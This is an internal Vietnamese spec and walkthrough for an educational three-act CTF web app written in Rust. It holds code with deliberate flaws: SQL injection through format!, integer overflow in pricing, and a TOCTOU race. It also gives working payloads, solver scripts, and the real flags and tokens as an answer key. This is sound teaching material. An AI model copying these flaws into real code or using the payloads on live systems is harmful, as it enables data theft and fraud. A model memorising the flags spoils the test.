# Thư Viện Cổ Antiqua — Spec & Walkthrough (Nội bộ)

> **Tài liệu thiết kế dành cho người ra đề / giám khảo. KHÔNG phát cho người chơi.**
> CTF giáo dục môn DBS — 3 Act / 3 Flag, backend Rust (`axum` + `sqlx` + SQLite).

---

## 0. Quyết định kiến trúc (Chốt trước khi code)

| Vấn đề | Quyết định |
|--------|-----------|
| **Web framework** | `axum` 0.7 + `tokio` (multi-thread runtime) |
| **DB** | `sqlx` + **SQLite** (file lưu tại `/tmp/db/antiqua.db`, writable tmpfs) |
| **Build** | **`--release`** bắt buộc; `Cargo.toml` KHÔNG bật `overflow-checks` |
| **Flag format** | `DBS{...}` |
| **State isolation** | **Mỗi container = 1 người chơi/team**. `entrypoint.sh` init DB mới mỗi lần start. Bổ sung endpoint ẩn `POST /admin/reset` (yêu cầu header token tĩnh) để reset Act 2/3 khi cần test lặp. |
| **ReadOnly rootfs** | rootfs readOnly + mount `emptyDir`/`tmpfs` cho `/tmp/db`. SQLite ghi dữ liệu tại đây. |
| **Port** | 5001 (docker-compose), 8080 trong container |

### Vị trí 3 Flag (Không trùng nhau, không lộ chéo)
- **Flag 1** — Nằm tại `users.secret_note` của user `admin` (chỉ trích xuất được qua SQLi tại `GET /search`).
- **Flag 2** — Server **chỉ trả về** trong handler `POST /buy` (dựng trực tiếp trong code) sau khi mua thành công sách restricted. Không lưu trong DB. (Trong DB chỉ có sách restricted với `title = 'Antiqua Secret Codex [locked]'`, không có cột nội dung/flag.)
- **Flag 3** — Chuỗi server trả về khi phát hiện một phiên đấu giá có >1 người thắng (double-settle). Không lưu trong DB.

---

### ⛓️ Chuỗi token ẩn (Chống AI one-shot) — CỐT LÕI THIẾT KẾ
Ba Act **phụ thuộc tuần tự** vào nhau thông qua hai token ẩn (KHÔNG phải flag). Các công cụ AI thường có xu hướng chỉ trích xuất chuỗi `DBS{...}` và bỏ qua các token đi kèm, dẫn đến việc bị kẹt ở các Act tiếp theo.

```
Act1 SQLi ─leak─> RESERVE_CODE ─/buy reserve=─> Act2 overflow ─trả─> BIDDER_PASS ─Act3─> Act3 race ─> FLAG3
   │                                                │
 FLAG1                                            FLAG2
```

| Token | Giá trị | Vị trí lưu trữ | Cấp quyền & Sử dụng |
|-------|---------|----------------|---------------------|
| `RESERVE_CODE` | `AQ-9c4f17-RSV` | Nhúng chung với Flag 1 trong `admin.secret_note` (DB - `src/db.rs`) | Bắt buộc gửi kèm qua field `reserve` khi mua sách restricted tại `POST /buy` |
| `BIDDER_PASS` | `BP-3f8a21-PASS` | Hằng số trong code (`src/routes/books.rs`), chỉ lộ ra khi mua restricted thành công | Bắt buộc gửi kèm khi gọi `POST /bids/ticket` và `POST /bids/settle` |

* `admin.secret_note` = `DBS{l3gacy_s34rch_un10n_1nj3ct10n} ::reserve=AQ-9c4f17-RSV`.
* **Bảo đảm cách ly:** SQLi ở Act 1 chỉ làm lộ Flag 1 + `RESERVE_CODE`; hoàn toàn không làm lộ Flag 2, Flag 3 hay `BIDDER_PASS` (do các giá trị này nằm trực tiếp trong logic code).

> ⚠️ **Quản lý cấu hình:** Chỉ cần thay đổi giá trị token/flag ở một vị trí duy nhất trong source code: `RESERVE_CODE` trong `src/db.rs`, `BIDDER_PASS` trong `src/routes/books.rs`.

---

## 1. Database schema

```sql
CREATE TABLE users (
  id           INTEGER PRIMARY KEY,
  username     TEXT NOT NULL UNIQUE,
  password     TEXT NOT NULL,          -- hash argon2 (login dùng prepared stmt)
  coins        INTEGER NOT NULL DEFAULT 1000,
  secret_note  TEXT                    -- admin: DBS{...}  (Act 1)
);

CREATE TABLE books (
  id        INTEGER PRIMARY KEY,
  title     TEXT NOT NULL,
  author    TEXT NOT NULL,
  price     INTEGER NOT NULL,          -- restricted book = 9999
  restricted INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE purchases (
  id       INTEGER PRIMARY KEY,
  user_id  INTEGER NOT NULL,
  book_id  INTEGER NOT NULL
);

CREATE TABLE bids (
  id      INTEGER PRIMARY KEY,
  item    TEXT NOT NULL,
  status  TEXT NOT NULL DEFAULT 'open',   -- 'open' | 'settled'  (Act 3)
  winner  TEXT
);

CREATE TABLE settlements (             -- audit; >1 row cho 1 bid = double-settle
  id      INTEGER PRIMARY KEY,
  bid_id  INTEGER NOT NULL,
  who     TEXT NOT NULL
);

CREATE TABLE tickets (                 -- Act 3: nonce dùng-một-lần cho settle
  id      INTEGER PRIMARY KEY,
  token   TEXT NOT NULL UNIQUE,        -- ngẫu nhiên (OsRng), cấp qua /bids/ticket
  bid_id  INTEGER NOT NULL,
  used    INTEGER NOT NULL DEFAULT 0   -- tiêu thụ nguyên tử: UPDATE ... WHERE used=0
);
```

**Seed quan trọng:**
- `admin` với `secret_note = 'DBS{l3gacy_s34rch_un10n_1nj3ct10n} ::reserve=AQ-9c4f17-RSV'` (Flag 1 thật + `RESERVE_CODE` cho Act 2).
- `seeker` / `seeker`, `coins = 1000`, `secret_note = 'DBS{f4k3_fl4g_th1s_1s_just_4_s33k3r_n0t_4dm1n}'` (Mồi nhử).
- `librarian`, `secret_note = 'DBS{f4k3_fl4g_l1br4r14n_s4ys_shhhh}'` (Mồi nhử).
- 5 sách thường (chứa 1 cuốn "The Forged Manuscript" làm mồi) + 1 sách restricted `price = 9999, restricted = 1`.
- 1 bid `status='open'` (mục tiêu Act 3) + 1 bid `status='settled'` với `winner = 'DBS{f4k3_fl4g_th1s_4uct10n_1s_4lr34dy_cl0s3d}'` (Mồi nhử cho ai dump bảng `bids`).

> **Mồi nhử (traps):** Nhiều chuỗi `DBS{f4k3_fl4g...}` nằm rải rác trong DB. Script exploit hoặc người chơi bắt buộc phải nhắm đúng vào `secret_note` của `admin` (`WHERE username='admin'`). Không có endpoint giải mã — flag thật được trích xuất trực tiếp.

### ⚠️ Thiết kế cho UNION (Act 1) — Bắt buộc khớp cột
Endpoint `/search` chạy câu truy vấn:
```sql
SELECT id, title, author FROM books WHERE title LIKE '%<q>%'
```
→ **3 cột, kiểu dữ liệu (int, text, text)**. Người chơi khi tiêm `UNION SELECT` với bảng `users` bắt buộc phải khớp đúng 3 cột:
```text
' UNION SELECT id, username, secret_note FROM users-- 
```

---

## 2. ACT 1 — "Cánh cổng giả" (SQLi qua `format!`)

### Rabbit hole (Cố ý vô hại)
`POST /login` sử dụng Prepared Statement chuẩn:
```rust
sqlx::query_as::<_, User>("SELECT * FROM users WHERE username = ? AND password = ?")
    .bind(&form.username).bind(&hash)
```
→ Mọi payload SQLi tiêm vào form login đều thất bại. Bẫy này được thiết kế để tiêu tốn ~30 phút của người chơi.

### Hint dẫn đường (Hành vi)
- Đã **gỡ bỏ** các comment tường minh lộ liễu như `legacy engine` trong `index.html`, `console.warn` lộ `secret_note`, hoặc `no bound params` trong `app.js`.
- **Breadcrumb hành vi còn lại:** Khi người chơi gõ ký tự đặc biệt (ví dụ dấu nháy đơn `'`), hệ thống sẽ trả về **lỗi SQL nguyên văn** (`books.rs` trả về `e.to_string()`), đủ để người chơi nhận diện lỗ hổng và bắt đầu dò số cột.

### Con đường thật — `GET /search?q=`
```rust
// src/routes/books.rs — LỖ HỔNG CỐ Ý
let sql = format!(
    "SELECT id, title, author FROM books WHERE title LIKE '%{}%'",
    q  // <-- Nối thẳng input của người dùng, không sử dụng bind
);
let rows = sqlx::query(&sql).fetch_all(&pool).await?;
```

### Payload kỳ vọng (Dành cho Walkthrough)
1. **Xác nhận injectable:** `/search?q=' OR '1'='1`
2. **Dò tìm số cột:** `/search?q=' ORDER BY 3--` (Hợp lệ) / `ORDER BY 4--` (Lỗi) → Xác nhận 3 cột.
3. **Trích xuất Flag & Token:**
   ```text
   http://localhost:5001/search?q=' UNION SELECT id, username, secret_note FROM users WHERE username='admin'-- 
   ```
   → Dòng kết quả mang `username = admin` sẽ chứa Flag 1 tại cột thứ 3:
   `DBS{l3gacy_s34rch_un10n_1nj3ct10n} ::reserve=AQ-9c4f17-RSV`

> **Lưu ý:** Cần chú ý URL-encode các ký tự khoảng trắng và dấu `--` khi kiểm tra bằng `curl` (ví dụ: `--%20` hoặc thêm khoảng trắng sau `--`).

---

## 3. ACT 2 — "Giá sách ma thuật" (Integer Overflow, Release Build)

### Tham số toán học
```text
base_price (restricted) = 9999    (Số lẻ -> gcd(9999, 2^32)=1, mọi số dư đều có thể đạt được)
balance (seeker)        = 1000
u32::MAX                = 4_294_967_295   (2^32 = 4_294_967_296)
```

### Lỗ hổng cố ý
```rust
// src/pricing.rs — KHÔNG sử dụng checked_mul hay wrapping_mul, chỉ dùng toán tử *
pub fn total_price(base_price: u32, quantity: u32) -> u32 {
    base_price * quantity   // Chế độ release: quay vòng (wrap); chế độ debug: panic
}
```
```rust
// src/routes/books.rs (buy handler)
// ⛓️ CỔNG CHUỖI: Sách restricted bắt buộc kiểm tra reserve = RESERVE_CODE (lấy từ Act 1).
if book.restricted == 1 && form.reserve.as_deref() != Some(crate::db::RESERVE_CODE) {
    return 403 {"error":"reserve_required"};   // Thông báo trung tính, không chỉ điểm lỗ hổng
}
let cost = total_price(book.price as u32, form.quantity);  // quantity = input từ người dùng
if (cost as i64) <= user.coins {        // cost(u32) ép sang i64 để so với coins(i64)
    // Thực hiện trừ tiền, ghi purchases, TRẢ VỀ FLAG 2 + "bidder_pass": BIDDER_PASS (cho Act 3)
}
```

### ⚠️ Điều kiện sống còn (Checklist Build)
- [ ] `Cargo.toml`:
  ```toml
  [profile.release]
  overflow-checks = false   # (Mặc định của chế độ release; KHÔNG đổi thành true)
  ```
- [ ] Dockerfile cấu hình build bắt buộc với `cargo build --release`.
- [ ] `quantity` phải là input runtime để tránh compiler thực hiện constant-folding gây compile error.
- [ ] Handler mua sách cấp quyền truy cập sách restricted **bất kể quantity là bao nhiêu**, chỉ cần điều kiện `cost <= coins` thỏa mãn.
- [ ] **Bắt buộc chặn `quantity == 0`** (trả về HTTP 400). Nếu không chặn, `cost = price * 0 = 0 <= coins` → Mua miễn phí, bypass hoàn toàn việc tính toán tràn số.

### Hint dẫn đường (Hành vi)
- Response khi mua thất bại trả về `{"total_price": <cost>, "balance": 1000}` → Người chơi nhìn thấy giá trị tính toán thực tế để nhận ra sự quay vòng của số.
- Khi thiếu hoặc sai `reserve`, server trả về `403 {"error":"reserve_required"}` → Buộc người chơi quay lại đọc kỹ phần `secret_note` của Act 1.
- Mua sách restricted thành công → Trả về `body` kèm `"bidder_pass":"BP-3f8a21-PASS"`.

### Lời giải chi tiết — Đã xác minh (VERIFIED)
Tìm `quantity` sao cho `(9999 * quantity) mod 2^32 <= 1000`.

**Cách A — Tìm quantity nhỏ nhất (Linear Scan):**
```text
quantity = 6_872_635   →  cost = 629 coin   ✓ (<= 1000)
```
**Cách B — Nhắm cost = 1 coin (Nghịch đảo Modulo):**
```text
quantity = 2_710_824_943   →  cost = 1 coin   ✓
```

**Python Script tính toán:**
```python
MOD, base, balance = 2**32, 9999, 1000
# Cách B: cost = 1
q_inv = pow(base, -1, MOD)               # 2710824943
assert (base * q_inv) % MOD == 1
print("Quantity (cost=1):", q_inv)

# Cách A: quantity nhỏ nhất
q_min = next(i for i in range(1, 2**24) if 0 < (base * i) % MOD <= balance)  # 6872635
print("Quantity nhỏ nhất:", q_min, "Cost:", (base * q_min) % MOD)
```

> **Bẫy dành cho AI/Người chơi:** Nếu giả định hệ thống compile ở chế độ debug, họ sẽ kết luận "phép nhân sẽ panic, không thể khai thác" → Sai lầm. Hệ thống chạy `--release`.

---

## 4. ACT 3 — "Đồng hồ đếm ngược" (TOCTOU Double-Spend)

### ⛓️ Cổng chuỗi + Cơ chế chống Replay
- Bắt buộc đính kèm `bidder_pass = BIDDER_PASS` (từ Act 2) cho cả 2 endpoint `POST /bids/ticket` và `POST /bids/settle`; nếu sai trả về 403 `not_verified_bidder`.
- **Nonce dùng một lần:** `POST /bids/ticket` cấp một `ticket` ngẫu nhiên lưu vào bảng `tickets(used=0)`.
- Khi gọi `settle`, hệ thống tiêu thụ ticket nguyên tử (atomic) bằng lệnh: `UPDATE tickets SET used=1 WHERE token=? AND used=0`. Nếu `rows_affected == 0`, trả về 409 `ticket_invalid`.
- ➔ **Hệ quả:** Nếu gửi lại cùng một request (cùng ticket), request thứ 2 sẽ bị từ chối với mã 409 và KHÔNG thể kích hoạt race condition. Để thành công, người chơi **phải xin 2 ticket khác nhau** và gửi đồng thời trong khung thời gian kẽ hở.

### Lỗ hổng cố ý
```rust
// src/routes/bids.rs — read ... await(gap) ... write, KHÔNG atomic
pub async fn settle(State(pool): ..., Json(req): ...) -> impl IntoResponse {
    // 0) Kiểm tra bidder_pass; tiêu thụ ticket nguyên tử (UPDATE ... WHERE used=0)
    // 1) READ (Đọc trạng thái)
    let bid = sqlx::query_as::<_,Bid>("SELECT * FROM bids WHERE id = ?")
        .bind(req.bid_id).fetch_one(&pool).await?;
    if bid.status != "open" {
        return error("auction closed");
    }
    // 2) WINDOW (Khung thời gian trễ mô phỏng xử lý chậm — nguồn gốc Race Condition)
    tokio::time::sleep(Duration::from_millis(250)).await;
    // 3) WRITE + Audit (Ghi nhận người thắng)
    sqlx::query("UPDATE bids SET status='settled', winner=? WHERE id=?")
        .bind(&req.who).bind(req.bid_id).execute(&pool).await?;
    sqlx::query("INSERT INTO settlements(bid_id, who) VALUES (?,?)")
        .bind(req.bid_id).bind(&req.who).execute(&pool).await?;

    // 4) Phát hiện Double-Settle ➔ CẤP FLAG 3
    let n: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM settlements WHERE bid_id=?")
        .bind(req.bid_id).fetch_one(&pool).await?;
    if n > 1 {
        return ok(json!({"flag": "DBS{t0ct0u_d0ubl3_s3ttl3m3nt_r4c3}"}));
    }
    ok(json!({"status":"settled"}))
}
```

### ⚠️ Điều kiện sống còn
- [ ] Trạng thái của phiên đấu giá nằm hoàn toàn dưới **DB**, KHÔNG lưu trong `Arc<Mutex>` in-process (Mutex sẽ block mất cơ hội race).
- [ ] KHÔNG dùng `BEGIN IMMEDIATE` hay `SELECT ... FOR UPDATE` bao quanh quá trình read→write.
- [ ] Runtime tokio hoạt động đa luồng; `sleep().await` bảo đảm các task nhường quyền thực thi (interleave) kể cả trên 1 thread.

### Hint dẫn đường (Hành vi)
- Đã **gỡ bỏ** các hướng dẫn lộ liễu trên giao diện như card "Race Condition — TOCTOU", timeline hay box "gửi 2 request đồng thời" trong `auction.html`.
- **Breadcrumb còn lại:** Khi settle thông thường thành công, server trả về `{"status":"settled","processing_window_ms":250}` → Gợi ý tường minh về khoảng thời gian trễ giữa READ và WRITE.

### Timeline kỳ vọng (Khi gửi kèm 2 ticket độc lập)
```text
T-     Xin ticket A và ticket B qua POST /bids/ticket (kèm bidder_pass)
T+0    Req A (ticket A): Consume A thành công ✓ → SELECT status='open' ✓
T+10   Req B (ticket B): Consume B thành công ✓ → SELECT status='open' ✓   (Req A chưa tới bước UPDATE)
T+250  Req A: UPDATE status='settled' + INSERT bản ghi settlement #1
T+251  Req B: UPDATE status='settled' + INSERT bản ghi settlement #2 → COUNT=2 → Server trả FLAG 3
```

### Script giải mẫu (Python `asyncio`)
```python
import asyncio
import aiohttp

BASE = "http://localhost:5001"
PASS = "BP-3f8a21-PASS"           # Token từ Act 2
COOKIE = {"Cookie": "antiqua_session=seeker"}

async def get_ticket(session):
    async with session.post(f"{BASE}/bids/ticket", json={"bid_id": 1, "bidder_pass": PASS}, headers=COOKIE) as r:
        return (await r.json())["ticket"]

async def settle(session, ticket):
    payload = {"bid_id": 1, "who": "seeker", "ticket": ticket, "bidder_pass": PASS}
    async with session.post(f"{BASE}/bids/settle", json=payload, headers=COOKIE) as r:
        print(await r.text())

async def main():
    async with aiohttp.ClientSession() as session:
        # Xin 2 ticket hoàn toàn khác nhau
        ticket_a = await get_ticket(session)
        ticket_b = await get_ticket(session)
        # Gửi 2 request đồng thời để tận dụng cửa sổ 250ms
        await asyncio.gather(settle(session, ticket_a), settle(session, ticket_b))

if __name__ == "__main__":
    asyncio.run(main())
```

> **Bẫy:** 
> (a) Nếu gửi tuần tự → request 2 sẽ thấy `status='settled'` → Thất bại. 
> (b) Nếu dùng lại cùng 1 ticket cho cả hai request → 1 request bị loại từ sớm với lỗi 409 `ticket_invalid` → Thất bại. 
> Bắt buộc phải dùng 2 ticket riêng biệt và gửi đồng thời trong khung 250ms.

---

## 5. Cấu trúc file & Trách nhiệm

```
antiqua-library/
├── Dockerfile            # multi-stage rust:slim (build --release) -> debian:slim
├── docker-compose.yml    # port 5001:8080
├── challenge.yaml        # K8s: UID 1000, readOnlyRootFS + tmpfs /tmp/db
├── entrypoint.sh         # tạo /tmp/db, init schema+seed, exec binary
├── Cargo.toml            # axum, sqlx (sqlite, runtime-tokio), tokio, serde, argon2
├── src/
│   ├── main.rs           # router, state(pool), bind 0.0.0.0:8080
│   ├── models.rs         # Định nghĩa User, Book, Bid
│   ├── db.rs             # Quản lý pool, init_db(), seed() và hằng số RESERVE_CODE
│   ├── pricing.rs        # total_price() — Nơi xảy ra OVERFLOW (Act 2)
│   └── routes/
│       ├── auth.rs       # /login dùng prepared stmt (Rabbit hole)
│       ├── books.rs      # /search format! (Act 1) + /buy overflow (Act 2) & BIDDER_PASS
│       └── bids.rs       # /bids/settle TOCTOU (Act 3)
├── templates/
│   ├── index.html        # Trang chủ + ô search
│   ├── login.html        # Form login (Rabbit hole)
│   ├── shop.html         # Danh mục + form mua sách (gọi /catalog, /buy)
│   └── auction.html      # Form settle + nút reset (gọi /bids/settle)
├── static/
│   ├── css/style.css
│   └── js/
│       ├── app.js        # Logic frontend gọi API
│       └── modal.js      # Popup hiển thị kết quả JSON
└── exploits/             # Script Python giải tự động cả 3 Act
```

### Bản đồ Endpoint
| Method | Path | Act | Ghi chú |
|--------|------|-----|---------|
| GET  | `/` | — | Trang chủ + ô tìm kiếm |
| GET·POST | `/login` | Rabbit hole | Form đăng nhập + Prepared Statement |
| GET  | `/shop` | — | Giao diện Act 2 (yêu cầu cookie đăng nhập) |
| GET  | `/auction` | — | Giao diện Act 3 (yêu cầu cookie đăng nhập) |
| GET  | `/search?q=` | **Act 1** | Tiêm SQLi qua `format!` |
| GET  | `/catalog` | — | Danh sách thư tịch (JSON), hiển thị sách restricted |
| POST | `/buy` | **Act 2** | Tràn số + kiểm tra `reserve`, trả về Flag 2 + `bidder_pass` |
| POST | `/bids/ticket` | **Act 3** | Cấp nonce dùng một lần (yêu cầu `bidder_pass`) |
| POST | `/bids/settle` | **Act 3** | TOCTOU + tiêu thụ ticket, trả về Flag 3 |
| POST | `/admin/reset` | Infra | Reset trạng thái Act 2/3 + xóa tickets (yêu cầu header `x-reset-token`) |

---

## 6. Checklist nghiệm thu trước khi giao

- [x] `docker compose up --build -d` ➔ Ứng dụng khởi chạy thành công trên port 5001.
- [x] **Act 1:** Payload UNION (`WHERE username='admin'`) trả về chính xác Flag 1 + `::reserve=AQ-9c4f17-RSV`, hoàn toàn không dính flag giả của seeker/librarian.
- [x] **Act 1:** Thử nghiệm SQLi tại form login thất bại (rabbit hole hoạt động đúng thiết kế).
- [x] **Act 2:** Khi thiếu hoặc sai `reserve` lúc mua sách restricted ➔ Trả về HTTP 403 `reserve_required` (không lộ flag).
- [x] **Act 2:** Build ở chế độ `--release`; gửi `quantity = 6_872_635` kèm `reserve` hợp lệ ➔ Trả về Flag 2 + `bidder_pass`.
- [x] **Act 2:** `quantity = 1` ➔ Báo lỗi không đủ tiền; `quantity = 0` ➔ HTTP 400 `invalid_quantity`.
- [x] **Act 3:** Khi thiếu hoặc sai `bidder_pass` ➔ Trả về HTTP 403 `not_verified_bidder` (tại cả `/ticket` và `/settle`).
- [x] **Act 3:** Dùng lại cùng 1 ticket cho 2 request settle ➔ 1 request bị từ chối với HTTP 409 `ticket_invalid`, không lộ flag.
- [x] **Act 3:** Gửi 2 ticket độc lập + 2 request đồng thời trong 250ms ➔ Trả về Flag 3; gửi tuần tự ➔ Thất bại.
- [x] **Hint hành vi:** Kiểm tra mã nguồn HTML/JS trên trình duyệt không còn các cụm từ lộ liễu chỉ điểm lỗ hổng.
- [x] **Cách ly dữ liệu:** Dump toàn bộ DB ở Act 1 không nhìn thấy Flag 2, Flag 3 hay `BIDDER_PASS`.
- [x] **Reset DB:** Endpoint reset hoạt động trơn tru, dọn sạch cả bảng `tickets` để test lặp.
- [x] **Bảo mật Container:** Rootfs read-only + tmpfs hoạt động ổn định dưới quyền UID 1000.
